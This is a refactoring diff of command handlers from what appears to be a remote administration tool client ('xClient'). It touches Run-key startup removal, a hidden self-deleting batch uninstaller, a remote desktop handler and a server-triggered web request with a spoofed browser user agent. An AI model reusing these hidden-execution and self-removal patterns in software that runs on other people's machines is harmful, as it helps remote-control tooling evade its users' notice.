@@ -137,21 +137,25 @@ namespace xClient.Core.Commands
 				{
 					try
 					{
-						RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-						if (key != null)
+						using (RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
 						{
-							key.DeleteValue(Settings.STARTUPKEY, true);
-							key.Close();
+							if (key != null)
+							{
+								key.DeleteValue(Settings.STARTUPKEY, true);
+								key.Close();
+							}
 						}
 					}
 					catch
 					{
 						// try deleting from Registry.CurrentUser
-						RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-						if (key != null)
+						using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
 						{
-							key.DeleteValue(Settings.STARTUPKEY, true);
-							key.Close();
+							if (key != null)
+							{
+								key.DeleteValue(Settings.STARTUPKEY, true);
+								key.Close();
+							}
 						}
 					}
 				}
@@ -159,11 +163,13 @@ namespace xClient.Core.Commands
 				{
 					try
 					{
-						RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-						if (key != null)
+						using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
 						{
-							key.DeleteValue(Settings.STARTUPKEY, true);
-							key.Close();
+							if (key != null)
+							{
+								key.DeleteValue(Settings.STARTUPKEY, true);
+								key.Close();
+							}
 						}
 					}
 					catch
@@ -171,38 +177,38 @@ namespace xClient.Core.Commands
 				}
 			}
 
-            try
-            {
-                string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".bat"));
+			try
+			{
+				string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".bat"));
 
-                string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ?
-                        "@echo off" + "\n" +
-                        "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                        "ping -n 20 localhost > nul" + "\n" +
-                        "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-                        "del " + "\"" + filename + "\""
-                    :
-                        "@echo off" + "\n" +
-                        "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                        "ping -n 20 localhost > nul" + "\n" +
-                        "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-                        "del " + "\"" + filename + "\""
-                    ;
+				string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ?
+						"@echo off" + "\n" +
+						"echo DONT CLOSE THIS WINDOW!" + "\n" +
+						"ping -n 20 localhost > nul" + "\n" +
+						"del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
+						"del " + "\"" + filename + "\""
+					:
+						"@echo off" + "\n" +
+						"echo DONT CLOSE THIS WINDOW!" + "\n" +
+						"ping -n 20 localhost > nul" + "\n" +
+						"del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
+						"del " + "\"" + filename + "\""
+					;
 
-                File.WriteAllText(filename, uninstallBatch);
-                ProcessStartInfo startInfo = new ProcessStartInfo();
-                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                startInfo.CreateNoWindow = true;
-                startInfo.UseShellExecute = true;
-                startInfo.FileName = filename;
-                Process.Start(startInfo);
-            }
-            finally
-            {
-                CloseShell();
-                SystemCore.Disconnect = true;
-                client.Disconnect();
-            }
+				File.WriteAllText(filename, uninstallBatch);
+				ProcessStartInfo startInfo = new ProcessStartInfo();
+				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+				startInfo.CreateNoWindow = true;
+				startInfo.UseShellExecute = true;
+				startInfo.FileName = filename;
+				Process.Start(startInfo);
+			}
+			finally
+			{
+				CloseShell();
+				SystemCore.Disconnect = true;
+				client.Disconnect();
+			}
 		}
 
 		public static void HandleRemoteDesktop(Packets.ServerPackets.Desktop command, Client client)
@@ -411,22 +417,22 @@ namespace xClient.Core.Commands
 				{
 					try
 					{
-						HttpWebRequest Request = (HttpWebRequest)HttpWebRequest.Create(url);
-						Request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36";
-						Request.AllowAutoRedirect = true;
-						Request.Timeout = 10000;
-						Request.Method = "GET";
+						HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
+						request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36";
+						request.AllowAutoRedirect = true;
+						request.Timeout = 10000;
+						request.Method = "GET";
 
-                        using (HttpWebResponse Response = (HttpWebResponse)Request.GetResponse())
-                        {
-                            using (Stream DataStream = Response.GetResponseStream())
-                            {
-                                using (StreamReader reader = new StreamReader(DataStream))
-                                {
+						using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+						{
+							using (Stream dataStream = response.GetResponseStream())
+							{
+								using (StreamReader reader = new StreamReader(dataStream))
+								{
 
-                                }
-                            }
-                        }
+								}
+							}
+						}
 					}
 					catch
 					{ }
